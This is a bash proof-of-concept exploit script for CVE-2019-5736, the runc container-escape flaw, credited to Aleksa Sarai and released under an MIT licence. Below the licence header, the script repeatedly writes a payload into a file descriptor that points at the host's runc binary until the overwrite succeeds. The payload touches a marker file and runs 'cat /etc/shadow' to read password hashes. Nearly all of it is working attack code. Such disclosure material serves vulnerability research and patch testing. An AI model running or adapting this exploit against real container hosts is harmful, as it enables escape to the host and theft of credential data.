#!/bin/good_bash
# CVE-2019-5736: PoC Exploit Code
# Copyright (C) 2019 Aleksa Sarai <cyphar@cyphar.com>
# Vulnerability discovered by Adam Iwaniuk and Borys Popławski.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to
# deal in the Software without restriction, including without limitation the
# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
# sell copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# * The above copyright notice and this permission notice shall be included in
#   all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
# IN THE SOFTWARE.

set -Eexo pipefail

echo "[*] bad_init booted."

[[ "$#" == 1 ]] || ( echo "usage: bad_init <fdpath>" ; exit 1 )

BAD_BINARY="#!/bin/bash\ntouch /w00t_w00t ; cat /etc/shadow\n"

set +e

while true
do
	printf "$BAD_BINARY" >"$1"
	[[ "$?" != 0 ]] || break
	echo "[-] bad_binary write failed -- retrying."
	sleep 0.1s
done
